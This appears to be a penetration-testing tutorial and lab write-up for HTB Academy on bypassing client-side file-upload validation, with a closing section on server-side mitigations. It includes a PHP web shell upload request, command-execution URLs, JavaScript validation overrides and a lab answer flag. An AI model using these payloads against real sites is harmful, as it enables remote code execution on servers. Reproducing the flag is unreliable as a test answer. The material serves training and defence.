# Client-Side Validation

> **🚫 Front-End Only:** Bypassing JavaScript-based file validation that occurs entirely in the browser

## Overview

Many web applications only rely on front-end JavaScript code to validate the selected file format before it is uploaded and would not upload it if the file is not in the required format (e.g., not an image).

However, as the file format validation is happening on the client-side, we can easily bypass it by directly interacting with the server, skipping the front-end validations altogether. We may also modify the front-end code through our browser's dev tools to disable any validation in place.

---

## Client-Side Validation

> **⚠️ Security Flaw:** Any code that runs on the client-side is under our control

The exercise shows a basic Profile Image functionality, frequently seen in web applications that utilize user profile features, like social media web applications.

### Identifying Client-Side Validation

**Common Indicators:**
- File dialog limited to specific formats (e.g., images only)
- Error messages appear without page refresh
- No HTTP requests sent during validation
- Upload button gets disabled based on file type

**Example Scenario:**
1. **File Selection Dialog** - Limited to `.jpg, .jpeg, .png` formats
2. **Invalid File Selection** - "Only images are allowed!" error message
3. **Upload Button Disabled** - No server interaction occurs
4. **No Network Activity** - Validation happens entirely in browser

### Why Client-Side Validation is Vulnerable

**Key Vulnerability Points:**
- **Complete Control** - All code executes within our browser
- **Source Code Access** - We can view and modify all JavaScript
- **Server Trust** - Backend may trust that frontend validated properly
- **Direct Server Access** - We can bypass frontend entirely

---

## Bypass Method 1: Back-end Request Modification

> **🔧 Direct Server Communication:** Bypass frontend by modifying HTTP requests

### Burp Suite Interception Method

**Step 1: Capture Normal Upload Request**
```http
POST /upload.php HTTP/1.1
Host: SERVER_IP:PORT
Content-Type: multipart/form-data; boundary=--WebKitFormBoundary

----WebKitFormBoundary
Content-Disposition: form-data; name="uploadFile"; filename="HTB.png"
Content-Type: image/png

[IMAGE CONTENT]
----WebKitFormBoundary--
```

**Step 2: Modify Request for PHP Upload**
```http
POST /upload.php HTTP/1.1
Host: SERVER_IP:PORT
Content-Type: multipart/form-data; boundary=--WebKitFormBoundary

----WebKitFormBoundary
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>
----WebKitFormBoundary--
```

**Step 3: Analyze Response**
```http
HTTP/1.1 200 OK
Content-Length: 29

File successfully uploaded
```

### Key Modification Points

**Critical Fields to Modify:**
1. **filename="HTB.png"** → **filename="shell.php"**
2. **[IMAGE CONTENT]** → **[PHP WEB SHELL CODE]**

**Optional Modifications:**
- **Content-Type:** Can be left as `image/png` or changed to `application/x-php`
- **File Extension:** Try different PHP extensions (`.phtml`, `.php5`, etc.)

### Complete Bypass Workflow

**Step 1: Setup Interception**
```bash
# Configure Burp Suite proxy
# Enable intercept in Proxy → Intercept tab
# Configure browser to use Burp proxy (127.0.0.1:8080)
```

**Step 2: Trigger Upload**
```bash
# Select any valid image file in the upload form
# Click Upload button to generate HTTP request
# Request will be intercepted by Burp Suite
```

**Step 3: Modify Request**
```bash
# Change filename from image to PHP
# Replace file content with web shell
# Forward modified request to server
```

**Step 4: Verify Upload**
```bash
# Check server response for success message
# Navigate to uploaded file location
# Test command execution
```

---

## Bypass Method 2: Disabling Front-end Validation

> **🛠️ Browser DevTools:** Modify JavaScript validation directly in the browser

### Browser Inspector Method

**Step 1: Access Page Inspector**
```bash
# Press [CTRL+SHIFT+C] to toggle Page Inspector
# Click on the profile image/upload area
# Locate the file input element in HTML
```

**Step 2: Analyze HTML File Input**
```html
<input type="file" name="uploadFile" id="uploadFile" 
       onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

**Key Elements:**
- **accept=".jpg,.jpeg,.png"** - File dialog filter
- **onchange="checkFile(this)"** - JavaScript validation function

**Step 3: Examine JavaScript Function**
```bash
# Open Browser Console [CTRL+SHIFT+K]
# Type function name: checkFile
# Analyze validation logic
```

**Example checkFile Function:**
```javascript
function checkFile(File) {
    var extension = File.value.split('.').pop().toLowerCase();
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    } else {
        $("#submit").attr("disabled", false);
    }
}
```

### Removing Validation Function

**Method 1: Remove onchange Attribute**
```html
<!-- Original -->
<input type="file" name="uploadFile" id="uploadFile" 
       onchange="checkFile(this)" accept=".jpg,.jpeg,.png">

<!-- Modified (remove onchange) -->
<input type="file" name="uploadFile" id="uploadFile" 
       accept=".jpg,.jpeg,.png">
```

**Method 2: Remove accept Attribute**
```html
<!-- Original -->
<input type="file" name="uploadFile" id="uploadFile" 
       onchange="checkFile(this)" accept=".jpg,.jpeg,.png">

<!-- Modified (remove accept) -->
<input type="file" name="uploadFile" id="uploadFile" 
       onchange="checkFile(this)">
```

**Method 3: Remove Both Attributes**
```html
<!-- Fully cleaned input -->
<input type="file" name="uploadFile" id="uploadFile">
```

### Browser-Specific Instructions

**Firefox Method:**
1. Right-click on file input → "Inspect Element"
2. Double-click on attribute name to edit
3. Delete unwanted attributes
4. Press Enter to save changes

**Chrome Method:**
1. Right-click on file input → "Inspect"
2. Double-click on attribute to edit
3. Delete content and press Enter
4. Changes apply immediately

**Edge Method:**
1. Press F12 to open DevTools
2. Use element selector to find file input
3. Edit attributes in HTML panel
4. Changes are applied automatically

### Testing Modified Upload

**Step 1: Upload PHP File**
```bash
# Select PHP web shell file
# No validation errors should occur
# Upload button remains enabled
```

**Step 2: Verify Upload Success**
```bash
# Check for success message
# Locate uploaded file URL
# Test command execution
```

**Step 3: Find Uploaded File Location**
```html
<!-- Inspect profile image after upload -->
<img src="/profile_images/shell.php" class="profile-image" id="profile-image">
```

---

## HTB Academy Lab Solutions

### Lab 1: Basic Client-Side Bypass

**Target:** `HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}`

**Method 1 - Burp Suite Interception:**
```bash
# Step 1: Intercept image upload request
# Step 2: Modify filename to shell.php
# Step 3: Replace content with <?php system($_REQUEST['cmd']); ?>
# Step 4: Forward request
# Step 5: Access http://target/profile_images/shell.php?cmd=cat /flag.txt
```

**Method 2 - Browser DevTools:**
```bash
# Step 1: Press [CTRL+SHIFT+C] in browser
# Step 2: Click on upload area to inspect
# Step 3: Remove onchange="checkFile(this)" from input
# Step 4: Upload PHP shell normally
# Step 5: Access uploaded file and execute commands
```

### Expected Workflow

**1. Reconnaissance:**
```bash
# Test normal image upload → SUCCESS
# Test PHP upload → BLOCKED with error message
# No page refresh during validation → Client-side validation confirmed
```

**2. Bypass Execution:**
```bash
# Choose bypass method (Burp or DevTools)
# Upload PHP web shell
# Verify "File successfully uploaded" response
```

**3. Command Execution:**
```bash
# Navigate to /profile_images/shell.php
# Test: ?cmd=whoami
# Flag: ?cmd=cat /flag.txt
```

---

## Advanced Client-Side Bypass Techniques

### JavaScript Function Overriding

**Method: Redefine Validation Function**
```javascript
// Override checkFile function in browser console
function checkFile(File) {
    // Do nothing - allow all files
    $("#submit").attr("disabled", false);
}
```

### Event Listener Removal

**Method: Remove Event Handlers**
```javascript
// Remove all change event listeners
document.getElementById('uploadFile').onchange = null;

// Or remove all event listeners
document.getElementById('uploadFile').removeEventListener('change', checkFile);
```

### Local Storage Manipulation

**Method: Modify Client-Side Variables**
```javascript
// If validation uses localStorage
localStorage.setItem('allowedExtensions', 'php,phtml,php5');

// If validation uses sessionStorage  
sessionStorage.setItem('fileTypeValidation', 'false');
```

### Form Validation Override

**Method: Disable HTML5 Validation**
```javascript
// Disable form validation
document.querySelector('form').setAttribute('novalidate', 'true');

// Remove required attributes
document.querySelectorAll('[required]').forEach(el => el.removeAttribute('required'));
```

---

## Detection and Mitigation

### Proper Server-Side Validation

**Essential Backend Checks:**
```php
// Always validate on server-side
$allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];

// Check MIME type
if (!in_array($_FILES['file']['type'], $allowedTypes)) {
    die("Invalid file type");
}

// Check file extension
$extension = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($extension, $allowedExtensions)) {
    die("Invalid file extension");
}

// Check file content (magic bytes)
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mimeType = finfo_file($finfo, $_FILES['file']['tmp_name']);
if (!in_array($mimeType, $allowedTypes)) {
    die("File content doesn't match extension");
}
```

### Defense-in-Depth Strategy

**Multiple Validation Layers:**
1. **Client-side validation** - User experience only
2. **Server-side extension check** - File extension validation
3. **MIME type verification** - Content-Type header check
4. **Magic byte analysis** - Actual file content inspection
5. **File size limits** - Prevent DoS attacks
6. **Filename sanitization** - Remove dangerous characters
7. **Isolated storage** - Non-executable upload directory

This comprehensive guide demonstrates why client-side validation alone is insufficient and provides practical methods to bypass such controls for successful penetration testing. 